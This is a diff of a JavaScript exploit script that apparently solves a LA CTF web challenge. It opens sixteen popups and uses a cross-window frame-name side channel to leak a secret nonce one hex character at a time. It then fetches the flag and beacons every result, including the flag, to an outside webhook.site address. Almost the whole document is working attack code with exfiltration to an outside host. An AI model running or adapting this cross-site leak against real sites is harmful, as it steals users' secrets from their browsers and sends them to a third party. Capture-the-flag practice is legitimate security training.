@@ -5,24 +5,20 @@
 var CHALL = 'https://notes.chall.lac.tf';
 var WH = 'https://webhook.site/c9c4e814-b8d9-47ab-ace4-1afa4d09088f';
 var HEX = '0123456789abcdef';
+var gc = 0;
 
 function ping(m) { new Image().src = WH + '?' + encodeURIComponent(m); }
 function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }
 
-function mkurl(prefix) {
-  return CHALL + '/?name=x&referrerPolicy=adf&search=' + encodeURIComponent(prefix);
-}
-
 async function run() {
   try {
-    ping('v2_start');
+    ping('v3_start');
     var t0 = Date.now();
 
-    // Open 16 popups
     var P = [];
     for (var i = 0; i < 16; i++) {
       try { P.push(window.open('about:blank')); } catch(e) { P.push(null); }
-      await sleep(20);
+      await sleep(15);
     }
     var cnt = 0;
     for (var i = 0; i < 16; i++) {
@@ -33,54 +29,49 @@ async function run() {
     var nonce = '';
 
     for (var pos = 0; pos < 8; pos++) {
-      try {
-        if (Date.now() - t0 > 50000) { ping('TO_' + pos); break; }
+      if (Date.now() - t0 > 52000) { ping('TO_' + pos); break; }
 
-        var found = null;
+      var found = null;
+      var cyc = 0;
 
-        // Navigate all popups
+      while (!found && Date.now() - t0 < 55000) {
+        gc++;
+        cyc++;
+        var nm = 'z' + gc;
+
+        // Navigate all popups with cycle-specific frame name
         for (var c = 0; c < cnt; c++) {
-          try { if (P[c] && !P[c].closed) P[c].location = mkurl(nonce + HEX[c]); } catch(e) {}
+          try {
+            if (P[c] && !P[c].closed)
+              P[c].location = CHALL + '/?name=x&referrerPolicy=' + nm + '&search=' + encodeURIComponent(nonce + HEX[c]);
+          } catch(e) {}
         }
-        await sleep(1500);
 
-        var cyc = 0;
-        for (var cycle = 0; cycle < 20 && !found; cycle++) {
-          if (Date.now() - t0 > 55000) break;
-          cyc = cycle;
-
-          // Check all popups
+        // Poll every 50ms - cycle-specific name ensures we only see NEW page
+        for (var poll = 0; poll < 40 && !found; poll++) {
+          await sleep(50);
+          var loaded = 0;
           for (var c = 0; c < cnt; c++) {
             try {
-              if (!P[c] || P[c].closed) continue;
-              var len = P[c].length;
-              if (len < 6) continue;
-              var ref = P[c]['adf'];
+              if (!P[c] || P[c].closed) { loaded++; continue; }
+              var ref = P[c][nm];
               if (!ref) continue;
+              loaded++;
               if (P[c][0] !== ref) {
                 found = HEX[c];
                 break;
               }
-            } catch(e) {}
+            } catch(e) { loaded++; }
           }
-          if (found) break;
-
-          // Reload all for fresh shuffle
-          for (var c = 0; c < cnt; c++) {
-            try { if (P[c] && !P[c].closed) P[c].location = mkurl(nonce + HEX[c]); } catch(e) {}
-          }
-          await sleep(650);
+          if (loaded >= cnt) break;
         }
+      }
 
-        if (found) {
-          nonce += found;
-          ping('p' + pos + '=' + found + '_c' + cyc);
-        } else {
-          ping('p' + pos + '=X_c' + cyc);
-          break;
-        }
-      } catch(e) {
-        ping('err' + pos + '=' + (e.message || '').substring(0, 25));
+      if (found) {
+        nonce += found;
+        ping('p' + pos + '=' + found + '_c' + cyc);
+      } else {
+        ping('p' + pos + '=X_c' + cyc);
         break;
       }
     }
@@ -92,11 +83,11 @@ async function run() {
         var r = await fetch(CHALL + '/guess?nonce=' + nonce);
         var f = await r.text();
         ping('FLAG=' + encodeURIComponent(f));
-      } catch(e) { ping('gerr'); }
+      } catch(e) { ping('gerr=' + (e.message||'').substring(0,20)); }
     }
 
     for (var i = 0; i < 16; i++) { try { if (P[i]) P[i].close(); } catch(e) {} }
-    ping('done');
+    ping('done_' + Math.round((Date.now()-t0)/1000) + 's');
   } catch(e) {
     ping('FATAL=' + (e.message || '').substring(0, 30));
   }
